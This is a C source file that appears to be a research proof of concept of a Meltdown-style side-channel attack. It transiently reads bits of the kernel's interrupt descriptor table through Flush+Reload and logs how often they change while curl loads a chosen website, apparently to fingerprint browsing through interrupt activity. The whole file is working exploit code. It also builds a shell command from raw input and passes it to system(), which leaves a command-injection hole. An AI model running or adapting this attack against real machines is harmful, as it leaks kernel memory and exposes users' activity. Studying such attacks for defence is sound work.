#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <fcntl.h>
#include "cacheutils.h"
#include "core_observer.h"
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <linux/membarrier.h>

// time interval for observing number of wakeups (in microseconds)
#define TIMER 5*1000

#define TIMER_S  (TIMER / (1000000))
#define TIMER_US (TIMER % (1000000))

#define TSX   0
#define FAULT 1
#define SPEC  2

#define HANDLER TSX 

#define OFFSET 32 // Lab17 & Lab12

typedef struct {
  uint16_t limit;
  size_t base __attribute__((packed));
} idt_t;

char __attribute__((aligned(4096))) oracle[4096 * 256];
char __attribute__((aligned(4096))) evictor[4096 * 8];

struct itimerval timer = {
    .it_interval = {.tv_sec = TIMER_S, .tv_usec = TIMER_US},
    .it_value = {.tv_sec = TIMER_S, .tv_usec = TIMER_US}
};

void pin_to_core(int core) {
    cpu_set_t cpuset;
    pthread_t thread;

    thread = pthread_self();

    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);

    pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset);
}

__attribute__((aligned(4096))) char test[4096 * 256];

volatile size_t cnt = 0;
FILE* f;

void sigalarm(int num) {
    //printf("Count: %zd\n", cnt);
    fprintf(f, "%zd\n", cnt);
    fflush(f);
    cnt = 0;
}

void* open_ws(void* ws) {
    usleep(100000);
    char cmd[128];
    sprintf(cmd, "curl -L %s", (char*)ws);
    system(cmd);
    usleep(100000);
    exit(0);
}

/* Application entry */
int main(int argc, char *argv[]) {
    if(argc <= 1) {
        printf("Usage: %s <website>\n", argv[0]);
        exit(1);
    }
    pin_to_core(CORE_OBSERVER);

    memset(oracle, 1, sizeof(oracle));
    memset(evictor, 2, sizeof(evictor));
    idt_t idt;
    asm volatile("sidt %0" : "=m"(idt) : : "memory");
    printf("IDT base: 0x%zx\n", idt.base);

    if (!CACHE_MISS)
      CACHE_MISS = detect_flush_reload_threshold();
    printf("Flush+Reload threshold: %zd\n", CACHE_MISS);

    signal(SIGSEGV, trycatch_segfault_handler);
    unsigned char *target = (unsigned char *)(idt.base + OFFSET * 16);
    printf("Reading %p [offset %d] using Meltdown\n", target, OFFSET);

    for (int i = 0; i < 256; i++)
      flush(oracle + i * 4096);

    f = fopen("log.txt", "w");

    signal(SIGALRM, sigalarm);
    setitimer(ITIMER_REAL, &timer, NULL);

    pthread_t p;
    pthread_create(&p, NULL, open_ws, argv[1]);

    while(1) {
#if HANDLER == FAULT
      if (!setjmp(trycatch_buf)) {
        maccess(NULL);
#endif

#if HANDLER == TSX
      if (xbegin() == (~0u)) {
        maccess(NULL);
#endif

#if HANDLER == SPEC
      speculation_start(sp);
#endif

        maccess(oracle + !!(*target) * 4096);

#if HANDLER == TSX
        xend();
      }
#endif
#if HANDLER == FAULT
      }
#endif
#if HANDLER == SPEC
      speculation_end(sp);
#endif
      if (flush_reload(oracle + 4096)) {
        cnt++;
        for (int ev = 0; ev < sizeof(evictor) / 4096; ev++) {
          maccess(evictor + ev * 4096 + OFFSET * 16);
        }
        asm volatile("mfence");
      }

      for (int i = 0; i < 10000; i++)
        asm volatile("nop");
    }

    return 0;
}
